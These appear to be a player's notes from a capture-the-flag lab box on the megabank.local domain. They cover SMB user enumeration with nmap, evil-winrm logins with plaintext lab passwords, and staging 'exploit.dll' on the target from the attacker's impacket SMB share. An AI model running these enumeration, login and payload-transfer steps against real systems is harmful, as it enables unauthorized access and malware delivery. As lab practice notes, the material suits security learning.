# Initial start - nmap just finished - Needed to slow down because of blocked requests
## Starting all port nmap
### Windows 10 build 14393
### Domain: megabank.local 
 - nmap script to enumerate smb users on the box
	* --scirpt smb-enum-users.nse
	* list of users in file smb-users.txt 
	* Super awesome grep and cut techniques
	* `cat smb-enum-users.nmap | grep MEGABANK | cut -f 2 -d '\' | cut -f 1 -d ' '`

#### Refer to smb-enum.md for notes 

### Just be evil.. Looking into wireshark to understand how it is connectinig.
```
./evil-winrm.rb -i 10.10.10.169 -u melanie -p Welcome123!
```
- Looks like evil-winrm was able to get a ticket and use it to authenticate

####  Connecting over port 5985 - winrm over http

## ryan's password: Serv3r4Admin4cc123!
### Connect over evil winrm
- ./evil-winrm.rb -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!

### Transfering files via smb and impacket
- Turn on impacket smbserver.py
```smbserver.py exploit .```
	* where exploit is the name of the share and the '.' is the location of the directory that is being shared


- Need to use the net command
```
 net use \\10.10.14.10 
```
	* to select the running smb server
```
copy \\10.10.14.10\exploit\exploit.dll
```
	* to copy the file from the share to the current directory that I am in
